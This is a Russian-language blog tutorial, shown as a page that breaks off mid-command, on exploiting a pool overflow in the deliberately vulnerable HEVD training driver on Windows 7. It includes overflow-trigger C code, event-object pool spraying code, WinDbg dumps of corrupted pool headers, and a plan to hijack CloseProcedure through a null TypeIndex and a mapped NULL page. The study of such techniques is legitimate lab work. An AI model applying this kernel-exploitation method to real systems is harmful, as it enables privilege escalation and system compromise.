<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>Windows Kernel Exploitation 0x03 | Pool Overflow [ru]</title>

  <link rel="stylesheet" href="/css/main.css">
  <!-- <link href="assets/favicon.ico" rel="icon" type="image/x-icon" /> -->
  <link rel="shortcut icon" type="image/png" href="assets//favicon.png">
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Windows Kernel Exploitation 0x03 Pool Overflow [ru] | Windows Internals Blog</title>
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Windows Kernel Exploitation 0x03 Pool Overflow [ru]" />
<meta name="author" content="truebad0ur" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="будет перевод вот этой статейки И ещё вот этой Pool Feng-Shui Перед тем как мы погрузимся в Pool Overflow, нам нужно понять базу пула, как его использовать для наших целей. Действительно хорошая статья по этому поводу есть у Tarjei Mandt. Настоятельно рекумендуется прочитать её перед тем, как идти дальше Ядерный пул очень похож на кучу Windows, так как он используется для хранения динамических аллокаций памяти. Как и Heap Spray для подготовки(?) к обычным приложениям, в пространстве ядра нам нужно найти способ подготовки(?) пула таким образом, чтобы мы могли предсказуемо вызвать наш шеллкод из памяти. Очень важно понимать концепцию аллокатора пула и как работает механизм аллокации и деаллокации пула. Для нашего HEVD драйвера уязвимый пользовательский буфер аллоциется в невыгружемом пуле, так что нам нужно найти технику для грума(?) невыгружаемого пула. Windows предоставляет объект события, который хранится в невыгружаемом пуле и может быть создан с помощью CreateEvent: HANDLE WINAPI CreateEvent( _In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes, _In_ BOOL bManualReset, _In_ BOOL bInitialState, _In_opt_ LPCTSTR lpName ); Здесь нам нужно создать два больших массива объектов события с помощью этого апи и затем создать дыры в этом аллоцированном чанке с помощью освобождения некоторых из объектов события в одном из массивов, используя CloseHandle, которые после объединения объединятся в большее большие свободные чанки: BOOL WINAPI CloseHandle( _In_ HANDLE hObject ); В эти свободные чанки нам нужно будет вставить наш уязвимый пользовательский буфер таким образом, чтобы он надежно перезаписывал нужную область памяти каждый раз, как мы будем “портить” соседний заголовок объекта события, чтобы перенаправить поток выполнения на наш шеллкод. После этого мы положим указатель на наш шеллкод таким образом, чтобы он мог быть вызван с помощью манипуляций нашим покоррапченным заголовком. Мы будем фейкать заголовок OBJECT_TYPE, переписывая указатель на одну из процедур в OBJECT_TYPE_INITIALIZER В сорцах видим то же: нет проверким на длину переданного буфера. __try { DbgPrint(&quot;[+] Allocating Pool chunk\n&quot;); // Allocate Pool chunk KernelBuffer = ExAllocatePoolWithTag(NonPagedPool, (SIZE_T)POOL_BUFFER_SIZE, (ULONG)POOL_TAG); if (!KernelBuffer) { // Unable to allocate Pool chunk DbgPrint(&quot;[-] Unable to allocate Pool chunk\n&quot;); Status = STATUS_NO_MEMORY; return Status; } else { DbgPrint(&quot;[+] Pool Tag: %s\n&quot;, STRINGIFY(POOL_TAG)); DbgPrint(&quot;[+] Pool Type: %s\n&quot;, STRINGIFY(NonPagedPool)); DbgPrint(&quot;[+] Pool Size: 0x%X\n&quot;, (SIZE_T)POOL_BUFFER_SIZE); DbgPrint(&quot;[+] Pool Chunk: 0x%p\n&quot;, KernelBuffer); } // Verify if the buffer resides in user mode ProbeForRead(UserBuffer, (SIZE_T)POOL_BUFFER_SIZE, (ULONG)__alignof(UCHAR)); DbgPrint(&quot;[+] UserBuffer: 0x%p\n&quot;, UserBuffer); DbgPrint(&quot;[+] UserBuffer Size: 0x%X\n&quot;, Size); DbgPrint(&quot;[+] KernelBuffer: 0x%p\n&quot;, KernelBuffer); DbgPrint(&quot;[+] KernelBuffer Size: 0x%X\n&quot;, (SIZE_T)POOL_BUFFER_SIZE); #ifdef SECURE // Secure Note: This is secure because the developer is passing a size // equal to size of the allocated Pool chunk to RtlCopyMemory()/memcpy(). // Hence, there will be no overflow RtlCopyMemory(KernelBuffer, UserBuffer, (SIZE_T)POOL_BUFFER_SIZE); #else DbgPrint(&quot;[+] Triggering Pool Overflow\n&quot;); // Vulnerability Note: This is a vanilla Pool Based Overflow vulnerability // because the developer is passing the user supplied value directly to // RtlCopyMemory()/memcpy() without validating if the size is greater or // equal to the size of the allocated Pool chunk RtlCopyMemory(KernelBuffer, UserBuffer, Size); Снова пишем сплойт, ставим бряку и смотрим: #include &lt;Windows.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #define IO_CODE 0x22200f const char kDevName[] = &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;; int main() { printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\n&quot;); const char* poc = &quot;AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp&quot;; //printf(&quot;%d&quot;, sizeof(poc)); DWORD bytesRetn; printf(&quot;[+] Starting interaction with the driver\n&quot;); DeviceIoControl(hDevice, IO_CODE, (LPVOID)poc, 100, NULL, 0, &amp;bytesRetn, NULL); //system(&quot;cmd.exe&quot;); CloseHandle(hDevice); return 0; } in windbg: ed nt!Kd_Default_Mask 8 .sympath+ location_of_HEVD_pdb .reload .reload /f bp HEVD!TriggerPoolOverflow bp HEVD!TriggerPoolOverflow+e6 kd&gt; g [+] Allocating Pool chunk [+] Pool Tag: &#39;kcaH&#39; [+] Pool Type: NonPagedPool [+] Pool Size: 0x1F8 [+] Pool Chunk: 0x8509E008 [+] UserBuffer: 0x012721B0 [+] UserBuffer Size: 0x64 [+] KernelBuffer: 0x8509E008 [+] KernelBuffer Size: 0x1F8 [+] Triggering Pool Overflow [+] Freeing Pool chunk [+] Pool Tag: &#39;kcaH&#39; [+] Pool Chunk: 0x8509E008 ****** HACKSYS_EVD_IOCTL_POOL_OVERFLOW ****** Попробуем длину ровно 0x1F8, будем на границе допустимого: kd&gt; g [+] Allocating Pool chunk [+] Pool Tag: &#39;kcaH&#39; [+] Pool Type: NonPagedPool [+] Pool Size: 0x1F8 [+] Pool Chunk: 0x850C4D50 [+] UserBuffer: 0x00375668 [+] UserBuffer Size: 0x1F8 [+] KernelBuffer: 0x850C4D50 [+] KernelBuffer Size: 0x1F8 [+] Triggering Pool Overflow kd&gt; !pool 0x850C4D50 Pool page 850c4d50 region is Unknown 850c4000 size: 48 previous size: 0 (Free ) Vad 850c4048 size: 48 previous size: 48 (Free ) Vad 850c4090 size: 48 previous size: 48 (Free ) Vad 850c40d8 size: 48 previous size: 48 (Free ) Vad 850c4120 size: 48 previous size: 48 (Free ) Vad 850c4168 size: 28 previous size: 48 (Allocated) FSro 850c4190 size: b8 previous size: 28 (Allocated) File (Protected) 850c4248 size: 128 previous size: b8 (Allocated) Ntfi 850c4370 size: 98 previous size: 128 (Allocated) MmCa 850c4408 size: 168 previous size: 98 (Allocated) CcSc 850c4570 size: 68 previous size: 168 (Allocated) FMsl 850c45d8 size: c8 previous size: 68 (Allocated) Ntfx 850c46a0 size: b8 previous size: c8 (Allocated) File (Protected) 850c4758 size: 128 previous size: b8 (Allocated) Ntfi 850c4880 size: 98 previous size: 128 (Allocated) MmCa 850c4918 size: 28 previous size: 98 (Free) CcSc 850c4940 size: 140 previous size: 28 (Free ) Io Process: 86db94b8 850c4a80 size: 128 previous size: 140 (Allocated) Ntfi 850c4ba8 size: b8 previous size: 128 (Allocated) File (Protected) 850c4c60 size: c8 previous size: b8 (Allocated) Ntfx 850c4d28 size: 20 previous size: c8 (Free) Io *850c4d48 size: 200 previous size: 20 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) 850c4f48 size: b8 previous size: 200 (Allocated) File (Protected) kd&gt; dd 850c4d48 L90 850c4d48 04400004 6b636148 00000000 0030e810 850c4d58 41414141 41414141 41414141 41414141 850c4d68 41414141 41414141 41414141 41414141 850c4d78 41414141 41414141 41414141 41414141 850c4d88 41414141 41414141 41414141 41414141 850c4d98 41414141 41414141 41414141 41414141 850c4da8 41414141 41414141 41414141 41414141 850c4db8 41414141 41414141 41414141 41414141 850c4dc8 41414141 41414141 41414141 41414141 850c4dd8 41414141 41414141 41414141 41414141 850c4de8 41414141 41414141 41414141 41414141 850c4df8 41414141 41414141 41414141 41414141 850c4e08 41414141 41414141 41414141 41414141 850c4e18 41414141 41414141 41414141 41414141 850c4e28 41414141 41414141 41414141 41414141 850c4e38 41414141 41414141 41414141 41414141 850c4e48 41414141 41414141 41414141 41414141 850c4e58 41414141 41414141 41414141 41414141 850c4e68 41414141 41414141 41414141 41414141 850c4e78 41414141 41414141 41414141 41414141 850c4e88 41414141 41414141 41414141 41414141 850c4e98 41414141 41414141 41414141 41414141 850c4ea8 41414141 41414141 41414141 41414141 850c4eb8 41414141 41414141 41414141 41414141 850c4ec8 41414141 41414141 41414141 41414141 850c4ed8 41414141 41414141 41414141 41414141 850c4ee8 41414141 41414141 41414141 41414141 850c4ef8 41414141 41414141 41414141 41414141 850c4f08 41414141 41414141 41414141 41414141 850c4f18 41414141 41414141 41414141 41414141 850c4f28 41414141 41414141 41414141 41414141 850c4f38 41414141 41414141 41414141 41414141 850c4f48 04170040 e56c6946 00000400 000000f8 850c4f58 00000000 00000000 00000000 00000000 850c4f68 00000001 00000000 00000000 400c001c 850c4f78 82746b40 00000000 00800005 854962c0 kd&gt; dd 850c4f48 850c4f48 04170040 e56c6946 00000400 000000f8 850c4f58 00000000 00000000 00000000 00000000 850c4f68 00000001 00000000 00000000 400c001c 850c4f78 82746b40 00000000 00800005 854962c0 Видим, что влезли идеально ... const char* poc = std::string(0x1f8, &#39;A&#39;).c_str(); ... DeviceIoControl(hDevice, IO_CODE, (LPVOID)poc, 0x1f8, NULL, 0, &amp;bytesRetn, NULL); ... Впереди нашего чанка хедер следующего, если мы его покорраптим, улетим в BSOD kd&gt; dd 850c4f48-8 850c4f40 41414141 41414141 04170040 e56c6946 850c4f50 00000400 000000f8 00000000 00000000 850c4f60 00000000 00000000 00000001 00000000 Поменяем длину на 0x200 и посмотрим, что будет: kd&gt; !pool 0x850C4D50 Pool page 850c4d50 region is Unknown 850c4000 size: 48 previous size: 0 (Allocated) Vad 850c4048 size: 48 previous size: 48 (Allocated) Vad 850c4090 size: 48 previous size: 48 (Allocated) Vad 850c40d8 size: 48 previous size: 48 (Allocated) Vad 850c4120 size: 48 previous size: 48 (Allocated) Vad 850c4168 size: 28 previous size: 48 (Allocated) FSro 850c4190 size: b8 previous size: 28 (Allocated) File (Protected) 850c4248 size: 128 previous size: b8 (Allocated) Ntfi 850c4370 size: 98 previous size: 128 (Allocated) MmCa 850c4408 size: 168 previous size: 98 (Allocated) CcSc 850c4570 size: 68 previous size: 168 (Allocated) FMsl 850c45d8 size: c8 previous size: 68 (Allocated) Ntfx 850c46a0 size: b8 previous size: c8 (Allocated) File (Protected) 850c4758 size: 128 previous size: b8 (Allocated) Ntfi 850c4880 size: 98 previous size: 128 (Allocated) MmCa 850c4918 size: 28 previous size: 98 (Free) CcSc 850c4940 size: 140 previous size: 28 (Free ) Io Process: 86db94b8 850c4a80 size: 128 previous size: 140 (Allocated) Ntfi 850c4ba8 size: b8 previous size: 128 (Allocated) File (Protected) 850c4c60 size: c8 previous size: b8 (Allocated) Ntfx 850c4d28 size: 20 previous size: c8 (Free) Io *850c4d48 size: 200 previous size: 20 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) 850c4f48 doesn&#39;t look like a valid small pool allocation, checking to see if the entire page is actually part of a large page allocation... 850c4f48 is not a valid large pool allocation, checking large session pool... 850c4f48 is not valid pool. Checking for freed (or corrupt) pool Bad previous allocation size @850c4f48, last size was 40 kd&gt; dd 850c4f48-8 ReadVirtual: 850c4f40 not properly sign extended 850c4f40 41414141 41414141 41414141 41414141 850c4f50 00000400 000000f8 00000000 00000000 850c4f60 00000000 00000000 00000001 00000000 850c4f70 00000000 400c001c 82746b40 00000000 A fatal system error has occurred. Интересная вещь, которую нужно отметить - это как мы на самом деле можем контроилровать соседний заголовок с помощью нашего переполнения. Это уязвимость, которую мы будем эксплуатировать грумингом(?) предсказуемым образом, избавлясь от рандома в нашем пуле. Для этого упомянутый ранее CreateEvent подходит идеально, так как он имее тразмер 0x40, который идеально подойдёт для размера нашего пула 0x200 Мы будем спреить большое количество объектов событий, хранить хендлы на них в массивах и смотреть, как это влияет на пул HANDLE spray_event1[10000]; HANDLE spray_event2[5000]; for (int i = 0; i &lt; 10000; i++) { spray_event1[i] = CreateEventA(0, 0, 0, 0); } for (int i = 0; i &lt; 5000; i++) { spray_event2[i] = CreateEventA(0, 0, 0, 0); } kd&gt; !pool 0x850B4620 Pool page 850b4620 region is Unknown 850b4000 size: 40 previous size: 0 (Allocated) Even (Protected) 850b4040 size: 5d8 previous size: 40 (Free) pter *850b4618 size: 200 previous size: 5d8 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) ReadVirtual: 850b4914 not properly sign extended 850b4818 size: 100 previous size: 200 (Allocated) Io Process: 86db7030 850b4918 size: a8 previous size: 100 (Allocated) MmWe ReadVirtual: 850b4afc not properly sign extended 850b49c0 size: 140 previous size: a8 (Allocated) Io Process: 86db7030 ReadVirtual: 850b4bfc not properly sign extended 850b4b00 size: 100 previous size: 140 (Free ) Io Process: 86db7030 850b4c00 size: 40 previous size: 100 (Allocated) Even (Protected) 850b4c40 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4c80 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4cc0 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4d00 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4d40 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4d80 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4dc0 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4e00 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4e40 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4e80 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4ec0 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4f00 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4f40 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4f80 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4fc0 size: 40 previous size: 40 (Allocated) Even (Protected) Наши объекты событий заспреены в невыгружаемом пуле. Теперь нам нужно создать дыры и реаллокейтнуть наш уязвимый буфер Hack в созданные дыры. После реаллоцирования нашего уязвимого буфера нам нужно покорраптить хедер соседнего пула так, чтобы он вел к нашему шеллкоду. Размер объекта события будет 0x40 (0x38 + 0x8), включая заголовок пула kd&gt; !pool 0x850B4620 Pool page 850b4620 region is Unknown 850b4000 size: 40 previous size: 0 (Allocated) Even (Protected) 850b4040 size: 28 previous size: 40 (Free) pter 850b4068 size: 388 previous size: 28 (Free ) XSav 850b43f0 size: 40 previous size: 388 (Free ) Ussb Process: 86db7030 850b4430 size: 140 previous size: 40 (Allocated) Io Process: 86db7030 850b4570 size: a8 previous size: 140 (Free ) MmWe *850b4618 size: 200 previous size: a8 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) 850b4818 size: 60 previous size: 200 (Free) Io 850b4878 size: 388 previous size: 60 (Free ) XSav 850b4c00 size: 40 previous size: 388 (Allocated) Even (Protected) 850b4c40 size: 40 previous size: 40 (Allocated) Even (Protected) kd&gt; dt _POOL_HEADER 850b4618 nt!_POOL_HEADER +0x000 PreviousSize : 0y000010101 (0x15) +0x000 PoolIndex : 0y0000000 (0) +0x002 BlockSize : 0y001000000 (0x40) +0x002 PoolType : 0y0000010 (0x2) +0x000 Ulong1 : 0x4400015 +0x004 PoolTag : 0x6b636148 +0x004 AllocatorBackTraceIndex : 0x6148 +0x006 PoolTagHash : 0x6b63 Разберём хедеры: kd&gt; g [+] Allocating Pool chunk [+] Pool Tag: &#39;kcaH&#39; [+] Pool Type: NonPagedPool [+] Pool Size: 0x1F8 [+] Pool Chunk: 0x8524D4C8 [+] UserBuffer: 0x00098908 [+] UserBuffer Size: 0x1F8 [+] KernelBuffer: 0x8524D4C8 [+] KernelBuffer Size: 0x1F8 [+] Triggering Pool Overflow Break instruction exception - code 80000003 (first chance) HEVD!TriggerPoolOverflow+0xd8: a855a202 ff750c push dword ptr [ebp+0Ch] kd&gt; !pool 0x8524D4C8 Pool page 8524d4c8 region is Unknown 8524d000 size: 40 previous size: 0 (Allocated) Even (Protected) 8524d040 size: f8 previous size: 40 (Free) r... 8524d138 size: 388 previous size: f8 (Free ) XSav *8524d4c0 size: 200 previous size: 388 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) ReadVirtual: 8524d7fc not properly sign extended 8524d6c0 size: 140 previous size: 200 (Allocated) Io Process: 86d7e228 8524d800 size: 40 previous size: 140 (Allocated) Even (Protected) 8524d840 size: 40 previous size: 40 (Allocated) Even (Protected) 8524d880 size: 40 previous size: 40 (Allocated) Even (Protected) 8524d8c0 size: 40 previous size: 40 (Allocated) Even (Protected) 8524d900 size: 40 previous size: 40 (Allocated) Even (Protected) 8524d940 size: 40 previous size: 40 (Allocated) Even (Protected) 8524d980 size: 40 previous size: 40 (Allocated) Even (Protected) kd&gt; dd 8524d6c0-8 ReadVirtual: 8524d6b8 not properly sign extended 8524d6b8 41414141 41414141 14280040 20206f49 8524d6c8 00320033 0063005c 00720065 00700074 8524d6d8 006f0072 002e0070 006c0064 0000006c 8524d6e8 c0100002 0424007e 95d23b8f 00000000 8524d6f8 1c210007 20206f49 00000000 00630069 8524d708 005c0065 00610048 00640072 00690064 8524d718 006b0073 006f0056 0075006c 0065006d 8524d728 005c0031 00690057 0064006e 0077006f Так как мы спреим невыгружаемый пул с помощью объектов событий, мы можем просто добавить наши значения в конец нашего уязвимого буфера. Но это не сработает, так как хедеры имеют внутреннюю структуру, нужна некоторая модификация. Давайте копнём глубже в хедеры, чтобы понять, что модифицировать: Вещь, которая нас интересует, это TypeIndex, который на самом деле оффсет (0xC) в массиве указателей, который объявляет OBJECT_TYPE каждого объекта, который поддерживает Windows. kd&gt; dd nt!ObTypeIndexTable 8277aee0 00000000 bad0b0b0 84ec7860 84ec7798 8277aef0 84ec76d0 84ec74a0 84ec7360 84ec7298 8277af00 84ec71d0 84ecef78 84eceeb0 84ece818 84ec71d0 - оффсет 0xC 8277af10 84f60418 84f60350 84f61418 84f61350 8277af20 84f5f3f0 84f5f328 84f629b8 84f628f0 8277af30 84f62828 84f62760 84f62698 84f625d0 8277af40 84f62508 84f62440 84f62378 84f63040 8277af50 84f63f78 84f63bd8 84f63b10 84f63a48 kd&gt; dt nt!_OBJECT_TYPE 84f60418 . +0x000 TypeList : [ 0x84f60418 - 0x84f60418 ] +0x000 Flink : 0x84f60418 _LIST_ENTRY [ 0x84f60418 - 0x84f60418 ] +0x004 Blink : 0x84f60418 _LIST_ENTRY [ 0x84f60418 - 0x84f60418 ] +0x008 Name : &quot;Event&quot; +0x000 Length : 0xa +0x002 MaximumLength : 0xc +0x004 Buffer : 0x8cc08a88 &quot;Event&quot; +0x010 DefaultObject : +0x014 Index : 0xc &#39;&#39; +0x018 TotalNumberOfObjects : 0x4643 +0x01c TotalNumberOfHandles : 0x466f +0x020 HighWaterNumberOfObjects : 0x4643 +0x024 HighWaterNumberOfHandles : 0x466f +0x028 TypeInfo : +0x000 Length : 0x50 +0x002 ObjectTypeFlags : 0 &#39;&#39; +0x002 CaseInsensitive : 0y0 +0x002 UnnamedObjectsOnly : 0y0 +0x002 UseDefaultObject : 0y0 +0x002 SecurityRequired : 0y0 +0x002 MaintainHandleCount : 0y0 +0x002 MaintainTypeList : 0y0 +0x002 SupportsObjectCallbacks : 0y0 +0x002 CacheAligned : 0y0 +0x004 ObjectTypeCode : 2 +0x008 InvalidAttributes : 0x100 +0x00c GenericMapping : _GENERIC_MAPPING +0x01c ValidAccessMask : 0x1f0003 +0x020 RetainAccess : 0 +0x024 PoolType : 0 ( NonPagedPool ) +0x028 DefaultPagedPoolCharge : 0 +0x02c DefaultNonPagedPoolCharge : 0x40 +0x030 DumpProcedure : (null) +0x034 OpenProcedure : (null) +0x038 CloseProcedure : (null) Важные моменты: Первый указатель 00000000 очень важен, так как мы на Windows 7 (объяснение дальше) Следующий выделенный указатель 84f60418, который по оффсету 0xC от начала Анализируя, мы понимаем, что это объект типа Event Теперь самое интеерсное: член TypeInfo по оффсету 0x28 В конце этого члена есть вызовы нескольких процедур, можем использовать удобную из предоставленных. Будем импользовать CloseProcedure, находящуюся по 0x38 Оффсет на CloseProcedure становится 0x28 + 0x38 = 0x60 0x60 - это указатель, который мы будем переписывать указателем на шеллкод и затем вызывать метод CloseProcedure Наша цель - изменить оффсет TypeIndex с 0xc на 0x0, поскольку первый указатель является нулевым, а в Windows 7 существует недостаток, при котором возможно отображение NULL-страниц с помощью вызова NtAllocateVirtualMemory NTSTATUS ZwAllocateVirtualMemory( _In_ HANDLE ProcessHandle, _Inout_ PVOID *BaseAddress, _In_ ULONG_PTR ZeroBits, _Inout_ PSIZE_T RegionSize, _In_ ULONG AllocationType, _In_ ULONG Protect ); И затем пишем указатель на наш шеллкод в нужную локацию (0x60), используя вызов WriteProcessMemory BOOL WINAPI WriteProcessMemory( _In_ HANDLE hProcess, _In_ LPVOID lpBaseAddress, _In_ LPCVOID lpBuffer, _In_ SIZE_T nSize, _Out_ SIZE_T *lpNumberOfBytesWritten ); Ещё одно объяснение из следующей статьи (дальше делал по коду из второго мануала, TODO: переделать, убрать векторы) Общая идея атаки Что у нас есть сейчас? - возможность перезаписать память пула. Чтобы получить из этого выгоду, нам нужно найти способ поменять состояние пула на предсказуемое нами. Если мы повредим поля, мы улетим в БСОД. В целом, невыгружаемый пул фрагментирован, что значит, что в нём есть дыры из чанков, которые были освобождены другими процессами системы. Нам нужно заполнить эти дыры спрея кучу объектов в невыгружаемый пул так, что механизм аллокации положит наши чанки в эти пустые слоты. Как только это получится, нам нужно ещё заспреить объектов, чтобы самые частые(?) объекты в пуле были нашими. Приводя аналогию, В качестве аналогии, если бы у нас был мешок с фигурами из шахматного набора, у нас было бы мало шансов вытащить из него короля; однако, если мы добавим в мешок 15 000 королей, наши шансы значительно возрастут! И так, две цели: заспреить пул объектами, пока органически существующие в пуле дыри не заполнятся нашими объектами заспреить пул снова, чтобы увеличить количество объектов, которые мы аллоцировали, чтобы они были последовательными в невыгружаемом пуле Далее взять наши аллокации, которые образовали большой цельный блок, и проделаем в них дырки размеров с наш ядерный буфер, который мы можем аллоцировать с помощью функций драйвера. Наш ядерный буфер размером 0x200. Таким образом, когда наш буфер аллоцирован, аллокатор положит его по освобождённой 0x200 дыре, которую мы только что создали. Теперь наша аллокация(буфер) полностью окружена объектами, которые мы сами заспреили. Это прекрасно, потому что теперь, когда наш буфер переполняет соседней аллокации пула, мы будем знать, что конкретно мы перезаписываем, потому что это будет чанк, который мы сами и аллоцировали Мы будем использовать эту возможность перезаписи данных, чтобы предсказуемо перезаписать часть данных в одном из наших аллоцированных объектов, который, после освобождения, закончится тем, что ядро выполнит указатель функции, который мы заполним шеллкодом. Теперь план такой: спреим пул объектами, пока все органические дырки не будут заполнены нашими объектами спреим пул снова… делаем 0x200 дыры в аллокациях используем функции драйвера, чтобы заполнить нашим ядерным буфером новые дыры чтобы это распределение предсказуемо перезаписало информацию в соседней аллокации, что приведет к выполнению ядром нашего шеллкода, когда поврежденная аллокация будет освобождена Event objects Автор блога информирует нас, что Event Object идеальны для этой задачи, потому что их размер 0x40. Мы можем освободить 8 Event Objects и получить наши дырки размером 0x200 байт. &gt;&gt;&gt; 0x200 % 0x40 0 &gt;&gt;&gt; 0x200 / 0x40 8.0 На параметры нам всё равно, так что будем вызывать CreateEventA с нулями Что мы видим? Что наш чанк hack посередине аллоцированных CreateEvent’ом: kd&gt; !pool 0x8513C8C8 Pool page 8513c8c8 region is Unknown 8513c000 size: 388 previous size: 0 (Free ) XSav 8513c388 size: 438 previous size: 388 (Free) .... 8513c7c0 size: 40 previous size: 438 (Allocated) Even (Protected) 8513c800 size: 40 previous size: 40 (Allocated) Even (Protected) 8513c840 size: 40 previous size: 40 (Allocated) Even (Protected) 8513c880 size: 40 previous size: 40 (Allocated) Even (Protected) *8513c8c0 size: 200 previous size: 40 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) 8513cac0 size: 40 previous size: 200 (Allocated) Even (Protected) 8513cb00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cb40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cb80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cbc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ccc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cdc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ce00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ce40 size: 1c0 previous size: 40 (Free) Even И там у нас: kd&gt; dd 8513c8c0 L30 8513c8c0 04400008 6b636148 41414141 41414141 8513c8d0 41414141 41414141 41414141 41414141 8513c8e0 41414141 41414141 41414141 41414141 8513c8f0 41414141 41414141 41414141 41414141 8513c900 41414141 41414141 41414141 41414141 8513c910 41414141 41414141 41414141 41414141 8513c920 41414141 41414141 41414141 41414141 8513c930 41414141 41414141 41414141 41414141 8513c940 41414141 41414141 41414141 41414141 8513c950 41414141 41414141 41414141 41414141 8513c960 41414141 41414141 41414141 41414141 8513c970 41414141 41414141 41414141 41414141 Кстати, указатель на этот ядерный пул содержится в eax (вместо принта в самом драйвере можно было получить адрес ещё из eax) Этот адрес - на 8 байт дальше самой аллокации, потому что 4-х байтовый лонг и тег кладутся до непосредственного буфера. kd&gt; !pool 8513c8c0 Pool page 8513c8c0 region is Unknown 8513c000 size: 388 previous size: 0 (Free ) XSav 8513c388 size: 438 previous size: 388 (Free) .... 8513c7c0 size: 40 previous size: 438 (Allocated) Even (Protected) 8513c800 size: 40 previous size: 40 (Allocated) Even (Protected) 8513c840 size: 40 previous size: 40 (Allocated) Even (Protected) 8513c880 size: 40 previous size: 40 (Allocated) Even (Protected) *8513c8c0 size: 200 previous size: 40 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) 8513cac0 size: 40 previous size: 200 (Allocated) Even (Protected) 8513cb00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cb40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cb80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cbc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ccc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cdc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ce00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ce40 size: 1c0 previous size: 40 (Free) Even kd&gt; dt nt!_POOL_HEADER 8513c8c0 +0x000 PreviousSize : 0y000001000 (0x8) +0x000 PoolIndex : 0y0000000 (0) +0x002 BlockSize : 0y001000000 (0x40) +0x002 PoolType : 0y0000010 (0x2) +0x000 Ulong1 : 0x4400008 +0x004 PoolTag : 0x6b636148 +0x004 AllocatorBackTraceIndex : 0x6148 +0x006 PoolTagHash : 0x6b63 kd&gt; db 8513c8c0+4 8513c8c4 48 61 63 6b 41 41 41 41-41 41 41 41 41 41 41 41 HackAAAAAAAAAAAA kd&gt; dt nt!_POOL_HEADER 8513cdc0 +0x000 PreviousSize : 0y000001000 (0x8) +0x000 PoolIndex : 0y0000000 (0) +0x002 BlockSize : 0y000001000 (0x8) +0x002 PoolType : 0y0000010 (0x2) +0x000 Ulong1 : 0x4080008 +0x004 PoolTag : 0xee657645 +0x004 AllocatorBackTraceIndex : 0x7645 +0x006 PoolTagHash : 0xee65 kd&gt; dt nt!_OBJECT_HEADER_QUOTA_INFO 8513cdc0+8 +0x000 PagedPoolCharge : 0 +0x004 NonPagedPoolCharge : 0x40 +0x008 SecurityDescriptorCharge : 0 +0x00c SecurityDescriptorQuotaBlock : (null) kd&gt; dt nt!_OBJECT_HEADER 8513cdc0+8+10 +0x000 PointerCount : 0n1 +0x004 HandleCount : 0n1 +0x004 NextToFree : 0x00000001 Void +0x008 Lock : _EX_PUSH_LOCK +0x00c TypeIndex : 0xc &#39;&#39; +0x00d TraceFlags : 0 &#39;&#39; +0x00e InfoMask : 0x8 &#39;&#39; +0x00f Flags : 0 &#39;&#39; +0x010 ObjectCreateInfo : 0x86e7f640 _OBJECT_CREATE_INFORMATION +0x010 QuotaBlockCharged : 0x86e7f640 Void +0x014 SecurityDescriptor : (null) +0x018 Body : _QUAD kd&gt; dd 